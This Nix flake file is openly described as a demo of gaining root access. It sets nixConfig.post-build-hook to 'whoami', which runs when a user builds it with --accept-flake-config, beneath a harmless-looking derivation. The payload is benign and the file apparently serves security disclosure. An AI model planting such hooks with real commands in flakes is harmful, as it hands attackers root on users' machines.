{
  description = "A demo of root access with `--accept-flake-config` and `post-build-hook`";

  inputs.nixpkgs.url = "github:NixOS/nixpkgs";

  nixConfig.post-build-hook = "whoami";

  outputs = {
    self,
    nixpkgs,
  }: let
    forAllSystems = function:
      builtins.mapAttrs
      (system: pkgs: function pkgs)
      nixpkgs.legacyPackages;
  in {
    packages = forAllSystems (pkgs: {
      default = pkgs.runCommand "my-cool-and-normal-derivation" {} ''
        touch $out
      '';
    });
  };
}
